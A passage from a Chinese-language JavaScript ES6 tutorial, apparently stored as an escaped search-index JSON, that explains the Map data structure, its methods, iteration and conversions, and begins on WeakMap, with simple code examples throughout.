\u6570\u636e\u7ed3\u6784\u3002\u5b83\u7c7b\u4f3c\u4e8e\u5bf9\u8c61\uff0c\u4e5f\u662f\u952e\u503c\u5bf9\u7684\u96c6\u5408\uff0c\u4f46\u662f\u201c\u952e\u201d\u7684\u8303\u56f4\u4e0d\u9650\u4e8e\u5b57\u7b26\u4e32\uff0c\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff08\u5305\u62ec\u5bf9\u8c61\uff09\u90fd\u53ef\u4ee5\u5f53\u4f5c\u952e\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cObject \u7ed3\u6784\u63d0\u4f9b\u4e86\u201c\u5b57\u7b26\u4e32\u2014\u503c\u201d\u7684\u5bf9\u5e94\uff0cMap \u7ed3\u6784\u63d0\u4f9b\u4e86\u201c\u503c\u2014\u503c\u201d\u7684\u5bf9\u5e94\uff0c\u662f\u4e00\u79cd\u66f4\u5b8c\u5584\u7684 Hash \u7ed3\u6784\u5b9e\u73b0\u3002\u5982\u679c\u4f60\u9700\u8981\u201c\u952e\u503c\u5bf9\u201d\u7684\u6570\u636e\u7ed3\u6784\uff0cMap \u6bd4 Object \u66f4\u5408\u9002\u3002</p> <pre><code>const m = new Map();\nconst o = {p: 'Hello World'};\n\nm.set(o, 'content')\nm.get(o) // \"content\"\n\nm.has(o) // true\nm.delete(o) // true\nm.has(o) // false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 Map \u7ed3\u6784\u7684<code>set</code>\u65b9\u6cd5\uff0c\u5c06\u5bf9\u8c61<code>o</code>\u5f53\u4f5c<code>m</code>\u7684\u4e00\u4e2a\u952e\uff0c\u7136\u540e\u53c8\u4f7f\u7528<code>get</code>\u65b9\u6cd5\u8bfb\u53d6\u8fd9\u4e2a\u952e\uff0c\u63a5\u7740\u4f7f\u7528<code>delete</code>\u65b9\u6cd5\u5220\u9664\u4e86\u8fd9\u4e2a\u952e\u3002</p> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u5c55\u793a\u4e86\u5982\u4f55\u5411 Map \u6dfb\u52a0\u6210\u5458\u3002\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0cMap \u4e5f\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002\u8be5\u6570\u7ec4\u7684\u6210\u5458\u662f\u4e00\u4e2a\u4e2a\u8868\u793a\u952e\u503c\u5bf9\u7684\u6570\u7ec4\u3002</p> <pre><code>const map = new Map([\n  ['name', '\u5f20\u4e09'],\n  ['title', 'Author']\n]);\n\nmap.size // 2\nmap.has('name') // true\nmap.get('name') // \"\u5f20\u4e09\"\nmap.has('title') // true\nmap.get('title') // \"Author\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u65b0\u5efa Map \u5b9e\u4f8b\u65f6\uff0c\u5c31\u6307\u5b9a\u4e86\u4e24\u4e2a\u952e<code>name</code>\u548c<code>title</code>\u3002</p> <p><code>Map</code>\u6784\u9020\u51fd\u6570\u63a5\u53d7\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b9e\u9645\u4e0a\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u7b97\u6cd5\u3002</p> <pre><code>const items = [\n  ['name', '\u5f20\u4e09'],\n  ['title', 'Author']\n];\n\nconst map = new Map();\n\nitems.forEach(\n  ([key, value]) =&gt; map.set(key, value)\n);\n</code></pre> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6570\u7ec4\uff0c\u4efb\u4f55\u5177\u6709 Iterator \u63a5\u53e3\u3001\u4e14\u6bcf\u4e2a\u6210\u5458\u90fd\u662f\u4e00\u4e2a\u53cc\u5143\u7d20\u7684\u6570\u7ec4\u7684\u6570\u636e\u7ed3\u6784\uff08\u8be6\u89c1\u300aIterator\u300b\u4e00\u7ae0\uff09\u90fd\u53ef\u4ee5\u5f53\u4f5c<code>Map</code>\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c<code>Set</code>\u548c<code>Map</code>\u90fd\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65b0\u7684 Map\u3002</p> <pre><code>const set = new Set([\n  ['foo', 1],\n  ['bar', 2]\n]);\nconst m1 = new Map(set);\nm1.get('foo') // 1\n\nconst m2 = new Map([['baz', 3]]);\nconst m3 = new Map(m2);\nm3.get('baz') // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5206\u522b\u4f7f\u7528 Set \u5bf9\u8c61\u548c Map \u5bf9\u8c61\uff0c\u5f53\u4f5c<code>Map</code>\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\uff0c\u7ed3\u679c\u90fd\u751f\u6210\u4e86\u65b0\u7684 Map \u5bf9\u8c61\u3002</p> <p>\u5982\u679c\u5bf9\u540c\u4e00\u4e2a\u952e\u591a\u6b21\u8d4b\u503c\uff0c\u540e\u9762\u7684\u503c\u5c06\u8986\u76d6\u524d\u9762\u7684\u503c\u3002</p> <pre><code>const map = new Map();\n\nmap\n.set(1, 'aaa')\n.set(1, 'bbb');\n\nmap.get(1) // \"bbb\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5bf9\u952e<code>1</code>\u8fde\u7eed\u8d4b\u503c\u4e24\u6b21\uff0c\u540e\u4e00\u6b21\u7684\u503c\u8986\u76d6\u524d\u4e00\u6b21\u7684\u503c\u3002</p> <p>\u5982\u679c\u8bfb\u53d6\u4e00\u4e2a\u672a\u77e5\u7684\u952e\uff0c\u5219\u8fd4\u56de<code>undefined</code>\u3002</p> <pre><code>new Map().get('asfddfsasadf')\n// undefined\n</code></pre> <p>\u6ce8\u610f\uff0c\u53ea\u6709\u5bf9\u540c\u4e00\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff0cMap \u7ed3\u6784\u624d\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u952e\u3002\u8fd9\u4e00\u70b9\u8981\u975e\u5e38\u5c0f\u5fc3\u3002</p> <pre><code>const map = new Map();\n\nmap.set(['a'], 555);\nmap.get(['a']) // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>set</code>\u548c<code>get</code>\u65b9\u6cd5\uff0c\u8868\u9762\u662f\u9488\u5bf9\u540c\u4e00\u4e2a\u952e\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fd9\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u7ec4\u5b9e\u4f8b\uff0c\u5185\u5b58\u5730\u5740\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u56e0\u6b64<code>get</code>\u65b9\u6cd5\u65e0\u6cd5\u8bfb\u53d6\u8be5\u952e\uff0c\u8fd4\u56de<code>undefined</code>\u3002</p> <p>\u540c\u7406\uff0c\u540c\u6837\u7684\u503c\u7684\u4e24\u4e2a\u5b9e\u4f8b\uff0c\u5728 Map \u7ed3\u6784\u4e2d\u88ab\u89c6\u4e3a\u4e24\u4e2a\u952e\u3002</p> <pre><code>const map = new Map();\n\nconst k1 = ['a'];\nconst k2 = ['a'];\n\nmap\n.set(k1, 111)\n.set(k2, 222);\n\nmap.get(k1) // 111\nmap.get(k2) // 222\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>k1</code>\u548c<code>k2</code>\u7684\u503c\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u5b83\u4eec\u5728 Map \u7ed3\u6784\u4e2d\u88ab\u89c6\u4e3a\u4e24\u4e2a\u952e\u3002</p> <p>\u7531\u4e0a\u53ef\u77e5\uff0cMap \u7684\u952e\u5b9e\u9645\u4e0a\u662f\u8ddf\u5185\u5b58\u5730\u5740\u7ed1\u5b9a\u7684\uff0c\u53ea\u8981\u5185\u5b58\u5730\u5740\u4e0d\u4e00\u6837\uff0c\u5c31\u89c6\u4e3a\u4e24\u4e2a\u952e\u3002\u8fd9\u5c31\u89e3\u51b3\u4e86\u540c\u540d\u5c5e\u6027\u78b0\u649e\uff08clash\uff09\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6269\u5c55\u522b\u4eba\u7684\u5e93\u7684\u65f6\u5019\uff0c\u5982\u679c\u4f7f\u7528\u5bf9\u8c61\u4f5c\u4e3a\u952e\u540d\uff0c\u5c31\u4e0d\u7528\u62c5\u5fc3\u81ea\u5df1\u7684\u5c5e\u6027\u4e0e\u539f\u4f5c\u8005\u7684\u5c5e\u6027\u540c\u540d\u3002</p> <p>\u5982\u679c Map \u7684\u952e\u662f\u4e00\u4e2a\u7b80\u5355\u7c7b\u578b\u7684\u503c\uff08\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\uff0c\u5219\u53ea\u8981\u4e24\u4e2a\u503c\u4e25\u683c\u76f8\u7b49\uff0cMap \u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u952e\uff0c\u6bd4\u5982<code>0</code>\u548c<code>-0</code>\u5c31\u662f\u4e00\u4e2a\u952e\uff0c\u5e03\u5c14\u503c<code>true</code>\u548c\u5b57\u7b26\u4e32<code>true</code>\u5219\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u952e\u3002\u53e6\u5916\uff0c<code>undefined</code>\u548c<code>null</code>\u4e5f\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u952e\u3002\u867d\u7136<code>NaN</code>\u4e0d\u4e25\u683c\u76f8\u7b49\u4e8e\u81ea\u8eab\uff0c\u4f46 Map \u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u952e\u3002</p> <pre><code>let map = new Map();\n\nmap.set(-0, 123);\nmap.get(+0) // 123\n\nmap.set(true, 1);\nmap.set('true', 2);\nmap.get(true) // 1\n\nmap.set(undefined, 3);\nmap.set(null, 4);\nmap.get(undefined) // 3\n\nmap.set(NaN, 123);\nmap.get(NaN) // 123\n</code></pre>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_8","title":"\u64cd\u4f5c\u65b9\u6cd5","text":"<p>\uff081\uff09size \u5c5e\u6027</p> <p><code>size</code>\u5c5e\u6027\u8fd4\u56de Map \u7ed3\u6784\u7684\u6210\u5458\u603b\u6570\u3002</p> <pre><code>const map = new Map();\nmap.set('foo', true);\nmap.set('bar', false);\n\nmap.size // 2\n</code></pre> <p>\uff082\uff09Map.prototype.set(key, value)</p> <p><code>set</code>\u65b9\u6cd5\u8bbe\u7f6e\u952e\u540d<code>key</code>\u5bf9\u5e94\u7684\u952e\u503c\u4e3a<code>value</code>\uff0c\u7136\u540e\u8fd4\u56de\u6574\u4e2a Map \u7ed3\u6784\u3002\u5982\u679c<code>key</code>\u5df2\u7ecf\u6709\u503c\uff0c\u5219\u952e\u503c\u4f1a\u88ab\u66f4\u65b0\uff0c\u5426\u5219\u5c31\u65b0\u751f\u6210\u8be5\u952e\u3002</p> <pre><code>const m = new Map();\n\nm.set('edition', 6)        // \u952e\u662f\u5b57\u7b26\u4e32\nm.set(262, 'standard')     // \u952e\u662f\u6570\u503c\nm.set(undefined, 'nah')    // \u952e\u662f undefined\n</code></pre> <p><code>set</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5f53\u524d\u7684<code>Map</code>\u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u91c7\u7528\u94fe\u5f0f\u5199\u6cd5\u3002</p> <pre><code>let map = new Map()\n  .set(1, 'a')\n  .set(2, 'b')\n  .set(3, 'c');\n</code></pre> <p>\uff083\uff09Map.prototype.get(key)</p> <p><code>get</code>\u65b9\u6cd5\u8bfb\u53d6<code>key</code>\u5bf9\u5e94\u7684\u952e\u503c\uff0c\u5982\u679c\u627e\u4e0d\u5230<code>key</code>\uff0c\u8fd4\u56de<code>undefined</code>\u3002</p> <pre><code>const m = new Map();\n\nconst hello = function() {console.log('hello');};\nm.set(hello, 'Hello ES6!') // \u952e\u662f\u51fd\u6570\n\nm.get(hello)  // Hello ES6!\n</code></pre> <p>\uff084\uff09Map.prototype.has(key)</p> <p><code>has</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u952e\u662f\u5426\u5728\u5f53\u524d Map \u5bf9\u8c61\u4e4b\u4e2d\u3002</p> <pre><code>const m = new Map();\n\nm.set('edition', 6);\nm.set(262, 'standard');\nm.set(undefined, 'nah');\n\nm.has('edition')     // true\nm.has('years')       // false\nm.has(262)           // true\nm.has(undefined)     // true\n</code></pre> <p>\uff085\uff09Map.prototype.delete(key)</p> <p><code>delete</code>\u65b9\u6cd5\u5220\u9664\u67d0\u4e2a\u952e\uff0c\u8fd4\u56de<code>true</code>\u3002\u5982\u679c\u5220\u9664\u5931\u8d25\uff0c\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>const m = new Map();\nm.set(undefined, 'nah');\nm.has(undefined)     // true\n\nm.delete(undefined)\nm.has(undefined)       // false\n</code></pre> <p>\uff086\uff09Map.prototype.clear()</p> <p><code>clear</code>\u65b9\u6cd5\u6e05\u9664\u6240\u6709\u6210\u5458\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002</p> <pre><code>let map = new Map();\nmap.set('foo', true);\nmap.set('bar', false);\n\nmap.size // 2\nmap.clear()\nmap.size // 0\n</code></pre>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_9","title":"\u904d\u5386\u65b9\u6cd5","text":"<p>Map \u7ed3\u6784\u539f\u751f\u63d0\u4f9b\u4e09\u4e2a\u904d\u5386\u5668\u751f\u6210\u51fd\u6570\u548c\u4e00\u4e2a\u904d\u5386\u65b9\u6cd5\u3002</p> <ul> <li><code>Map.prototype.keys()</code>\uff1a\u8fd4\u56de\u952e\u540d\u7684\u904d\u5386\u5668\u3002</li> <li><code>Map.prototype.values()</code>\uff1a\u8fd4\u56de\u952e\u503c\u7684\u904d\u5386\u5668\u3002</li> <li><code>Map.prototype.entries()</code>\uff1a\u8fd4\u56de\u6240\u6709\u6210\u5458\u7684\u904d\u5386\u5668\u3002</li> <li><code>Map.prototype.forEach()</code>\uff1a\u904d\u5386 Map \u7684\u6240\u6709\u6210\u5458\u3002</li> </ul> <p>\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cMap \u7684\u904d\u5386\u987a\u5e8f\u5c31\u662f\u63d2\u5165\u987a\u5e8f\u3002</p> <pre><code>const map = new Map([\n  ['F', 'no'],\n  ['T',  'yes'],\n]);\n\nfor (let key of map.keys()) {\n  console.log(key);\n}\n// \"F\"\n// \"T\"\n\nfor (let value of map.values()) {\n  console.log(value);\n}\n// \"no\"\n// \"yes\"\n\nfor (let item of map.entries()) {\n  console.log(item[0], item[1]);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n\n// \u6216\u8005\nfor (let [key, value] of map.entries()) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n\n// \u7b49\u540c\u4e8e\u4f7f\u7528map.entries()\nfor (let [key, value] of map) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6700\u540e\u7684\u90a3\u4e2a\u4f8b\u5b50\uff0c\u8868\u793a Map \u7ed3\u6784\u7684\u9ed8\u8ba4\u904d\u5386\u5668\u63a5\u53e3\uff08<code>Symbol.iterator</code>\u5c5e\u6027\uff09\uff0c\u5c31\u662f<code>entries</code>\u65b9\u6cd5\u3002</p> <pre><code>map[Symbol.iterator] === map.entries\n// true\n</code></pre> <p>Map \u7ed3\u6784\u8f6c\u4e3a\u6570\u7ec4\u7ed3\u6784\uff0c\u6bd4\u8f83\u5feb\u901f\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u3002</p> <pre><code>const map = new Map([\n  [1, 'one'],\n  [2, 'two'],\n  [3, 'three'],\n]);\n\n[...map.keys()]\n// [1, 2, 3]\n\n[...map.values()]\n// ['one', 'two', 'three']\n\n[...map.entries()]\n// [[1,'one'], [2, 'two'], [3, 'three']]\n\n[...map]\n// [[1,'one'], [2, 'two'], [3, 'three']]\n</code></pre> <p>\u7ed3\u5408\u6570\u7ec4\u7684<code>map</code>\u65b9\u6cd5\u3001<code>filter</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5b9e\u73b0 Map \u7684\u904d\u5386\u548c\u8fc7\u6ee4\uff08Map \u672c\u8eab\u6ca1\u6709<code>map</code>\u548c<code>filter</code>\u65b9\u6cd5\uff09\u3002</p> <pre><code>const map0 = new Map()\n  .set(1, 'a')\n  .set(2, 'b')\n  .set(3, 'c');\n\nconst map1 = new Map(\n  [...map0].filter(([k, v]) =&gt; k &lt; 3)\n);\n// \u4ea7\u751f Map \u7ed3\u6784 {1 =&gt; 'a', 2 =&gt; 'b'}\n\nconst map2 = new Map(\n  [...map0].map(([k, v]) =&gt; [k * 2, '_' + v])\n    );\n// \u4ea7\u751f Map \u7ed3\u6784 {2 =&gt; '_a', 4 =&gt; '_b', 6 =&gt; '_c'}\n</code></pre> <p>\u6b64\u5916\uff0cMap \u8fd8\u6709\u4e00\u4e2a<code>forEach</code>\u65b9\u6cd5\uff0c\u4e0e\u6570\u7ec4\u7684<code>forEach</code>\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u904d\u5386\u3002</p> <pre><code>map.forEach(function(value, key, map) {\n  console.log(\"Key: %s, Value: %s\", key, value);\n});\n</code></pre> <p><code>forEach</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a<code>this</code>\u3002</p> <pre><code>const reporter = {\n  report: function(key, value) {\n    console.log(\"Key: %s, Value: %s\", key, value);\n  }\n};\n\nmap.forEach(function(value, key, map) {\n  this.report(key, value);\n}, reporter);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>forEach</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u7684<code>this</code>\uff0c\u5c31\u6307\u5411<code>reporter</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_10","title":"\u4e0e\u5176\u4ed6\u6570\u636e\u7ed3\u6784\u7684\u4e92\u76f8\u8f6c\u6362","text":"<p>\uff081\uff09Map \u8f6c\u4e3a\u6570\u7ec4</p> <p>\u524d\u9762\u5df2\u7ecf\u63d0\u8fc7\uff0cMap \u8f6c\u4e3a\u6570\u7ec4\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u3002</p> <pre><code>const myMap = new Map()\n  .set(true, 7)\n  .set({foo: 3}, ['abc']);\n[...myMap]\n// [ [ true, 7 ], [ { foo: 3 }, [ 'abc' ] ] ]\n</code></pre> <p>\uff082\uff09\u6570\u7ec4 \u8f6c\u4e3a Map</p> <p>\u5c06\u6570\u7ec4\u4f20\u5165 Map \u6784\u9020\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8f6c\u4e3a Map\u3002</p> <pre><code>new Map([\n  [true, 7],\n  [{foo: 3}, ['abc']]\n])\n// Map {\n//   true =&gt; 7,\n//   Object {foo: 3} =&gt; ['abc']\n// }\n</code></pre> <p>\uff083\uff09Map \u8f6c\u4e3a\u5bf9\u8c61</p> <p>\u5982\u679c\u6240\u6709 Map \u7684\u952e\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u5b83\u53ef\u4ee5\u65e0\u635f\u5730\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>function strMapToObj(strMap) {\n  let obj = Object.create(null);\n  for (let [k,v] of strMap) {\n    obj[k] = v;\n  }\n  return obj;\n}\n\nconst myMap = new Map()\n  .set('yes', true)\n  .set('no', false);\nstrMapToObj(myMap)\n// { yes: true, no: false }\n</code></pre> <p>\u5982\u679c\u6709\u975e\u5b57\u7b26\u4e32\u7684\u952e\u540d\uff0c\u90a3\u4e48\u8fd9\u4e2a\u952e\u540d\u4f1a\u88ab\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u4f5c\u4e3a\u5bf9\u8c61\u7684\u952e\u540d\u3002</p> <p>\uff084\uff09\u5bf9\u8c61\u8f6c\u4e3a Map</p> <pre><code>function objToStrMap(obj) {\n  let strMap = new Map();\n  for (let k of Object.keys(obj)) {\n    strMap.set(k, obj[k]);\n  }\n  return strMap;\n}\n\nobjToStrMap({yes: true, no: false})\n// Map {\"yes\" =&gt; true, \"no\" =&gt; false}\n</code></pre> <p>\uff085\uff09Map \u8f6c\u4e3a JSON</p> <p>Map \u8f6c\u4e3a JSON \u8981\u533a\u5206\u4e24\u79cd\u60c5\u51b5\u3002\u4e00\u79cd\u60c5\u51b5\u662f\uff0cMap \u7684\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u8f6c\u4e3a\u5bf9\u8c61 JSON\u3002</p> <pre><code>function strMapToJson(strMap) {\n  return JSON.stringify(strMapToObj(strMap));\n}\n\nlet myMap = new Map().set('yes', true).set('no', false);\nstrMapToJson(myMap)\n// '{\"yes\":true,\"no\":false}'\n</code></pre> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0cMap \u7684\u952e\u540d\u6709\u975e\u5b57\u7b26\u4e32\uff0c\u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u8f6c\u4e3a\u6570\u7ec4 JSON\u3002</p> <pre><code>function mapToArrayJson(map) {\n  return JSON.stringify([...map]);\n}\n\nlet myMap = new Map().set(true, 7).set({foo: 3}, ['abc']);\nmapToArrayJson(myMap)\n// '[[true,7],[{\"foo\":3},[\"abc\"]]]'\n</code></pre> <p>\uff086\uff09JSON \u8f6c\u4e3a Map</p> <p>JSON \u8f6c\u4e3a Map\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6240\u6709\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\u3002</p> <pre><code>function jsonToStrMap(jsonStr) {\n  return objToStrMap(JSON.parse(jsonStr));\n}\n\njsonToStrMap('{\"yes\": true, \"no\": false}')\n// Map {'yes' =&gt; true, 'no' =&gt; false}\n</code></pre> <p>\u4f46\u662f\uff0c\u6709\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u6574\u4e2a JSON \u5c31\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u4e14\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u672c\u8eab\uff0c\u53c8\u662f\u4e00\u4e2a\u6709\u4e24\u4e2a\u6210\u5458\u7684\u6570\u7ec4\u3002\u8fd9\u65f6\uff0c\u5b83\u53ef\u4ee5\u4e00\u4e00\u5bf9\u5e94\u5730\u8f6c\u4e3a Map\u3002\u8fd9\u5f80\u5f80\u662f Map \u8f6c\u4e3a\u6570\u7ec4 JSON \u7684\u9006\u64cd\u4f5c\u3002</p> <pre><code>function jsonToMap(jsonStr) {\n  return new Map(JSON.parse(jsonStr));\n}\n\njsonToMap('[[true,7],[{\"foo\":3},[\"abc\"]]]')\n// Map {true =&gt; 7, Object {foo: 3} =&gt; ['abc']}\n</code></pre>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#weakmap","title":"WeakMap","text":""},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_11","title":"\u542b\u4e49","text":"<p><code>WeakMap</code>\u7ed3\u6784\u4e0e<code>Map</code>\u7ed3\u6784\u7c7b\u4f3c\uff0c\u4e5f\u662f\u7528\u4e8e\u751f\u6210\u952e\u503c\u5bf9\u7684\u96c6\u5408\u3002</p> <pre><code>// WeakMap \u53ef\u4ee5\u4f7f\u7528 set \u65b9\u6cd5\u6dfb\u52a0\u6210\u5458\nconst wm1 = new WeakMap();\nconst key = {foo: 1};\nwm1.set(key, 2);\nwm1.get(key) // 2\n\n// WeakMap \u4e5f\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\uff0c\n// \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\nconst k1 = [1, 2, 3];\nconst k2 = [4, 5, 6];\nconst wm2 = new WeakMap([[k1, 'foo'], [k2, 'bar']]);\nwm2.get(k2) // \"bar\"\n</code></pre> <p><code>WeakMap</code>\u4e0e<code>Map</code>\u7684\u533a\u522b\u6709\u4e24\u70b9\u3002</p> <p>\u9996\u5148\uff0c<code>WeakMap</code>\u53ea\u63a5\u53d7\u5bf9\u8c61\u4f5c\u4e3a\u952e\u540d\uff08<code>null</code>\u9664\u5916\uff09\uff0c\u4e0d\u63a5\u53d7\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u4f5c\u4e3a\u952e\u540d\u3002</p> <pre><code>const map = new WeakMap();\nmap.set(1, 2)\n// TypeError: 1 is not an object!\nmap.set(Symbol(), 2)\n// TypeError: Invalid value used as weak map key\nmap.set(null, 2)\n// TypeError: Invalid value used as weak map key\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u5c06\u6570\u503c<code>1</code>\u548c<code>Symbol</code>\u503c\u4f5c\u4e3a WeakMap \u7684\u952e\u540d\uff0c\u90fd\u4f1a\u62a5\u9519\u3002</p> <p>\u5176\u6b21\uff0c<code>WeakMap</code>\u7684\u952e\u540d\u6240\u6307\u5411\u7684\u5bf9\u8c61\uff0c\u4e0d\u8ba1\u5165\u5783\u573e\u56de\u6536\u673a\u5236\u3002</p> <p><code>WeakMap</code>\u7684\u8bbe\u8ba1\u76ee\u7684\u5728\u4e8e\uff0c\u6709\u65f6\u6211\u4eec\u60f3\u5728\u67d0\u4e2a\u5bf9\u8c61\u4e0a\u9762\u5b58\u653e\u4e00\u4e9b\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u4f1a\u5f62\u6210\u5bf9\u4e8e\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>const e1 = document.getElementById('foo');\nconst e2 = document.getElementById('bar');\nconst arr = [\n  [e1, 'foo \u5143\u7d20'],\n  [e2, 'bar \u5143\u7d20'],\n];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>e1</code>\u548c<code>e2</code>\u662f\u4e24\u4e2a\u5bf9\u8c61\uff0c\u6211\u4eec\u901a\u8fc7<code>arr</code>\u6570\u7ec4\u5bf9\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u6dfb\u52a0\u4e00\u4e9b\u6587\u5b57\u8bf4\u660e\u3002\u8fd9\u5c31\u5f62\u6210\u4e86<code>arr</code>\u5bf9<code>e1</code>\u548c<code>e2</code>\u7684\u5f15\u7528\u3002</p> <p>\u4e00\u65e6\u4e0d\u518d\u9700\u8981\u8fd9\u4e24\u4e2a\u5bf9\u8c61\uff0c\u6211\u4eec\u5c31\u5fc5\u987b\u624b\u52a8\u5220\u9664\u8fd9\u4e2a\u5f15\u7528\uff0c\u5426\u5219\u5783\u573e\u56de\u6536\u673a\u5236\u5c31\u4e0d\u4f1a\u91ca\u653e<code>e1</code>\u548c<code>e2</code>\u5360\u7528\u7684\u5185\u5b58\u3002</p> <pre><code>// \u4e0d\u9700\u8981 e1 \u548c e2 \u7684\u65f6\u5019\n// \u5fc5\u987b\u624b\u52a8\u5220\u9664\u5f15\u7528\narr [0] = null;\narr [1] = null;\n</code></pre> <p>\u4e0a\u9762\u8fd9\u6837\u7684\u5199\u6cd5\u663e\u7136\u5f88\u4e0d\u65b9\u4fbf\u3002\u4e00\u65e6\u5fd8\u4e86\u5199\uff0c\u5c31\u4f1a\u9020\u6210\u5185\u5b58\u6cc4\u9732\u3002</p> <p>WeakMap \u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u8bde\u751f\u7684\uff0c\u5b83\u7684\u952e\u540d\u6240\u5f15\u7528\u7684\u5bf9\u8c61\u90fd\u662f\u5f31\u5f15\u7528\uff0c\u5373\u5783\u573e\u56de\u6536\u673a\u5236\u4e0d\u5c06\u8be5\u5f15\u7528\u8003\u8651\u5728\u5185\u3002\u56e0\u6b64\uff0c\u53ea\u8981\u6240\u5f15\u7528\u7684\u5bf9\u8c61\u7684\u5176\u4ed6\u5f15\u7528\u90fd\u88ab\u6e05\u9664\uff0c\u5783\u573e\u56de\u6536\u673a\u5236\u5c31\u4f1a\u91ca\u653e\u8be5\u5bf9\u8c61\u6240\u5360\u7528\u7684\u5185\u5b58\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u65e6\u4e0d\u518d\u9700\u8981\uff0cWeakMap 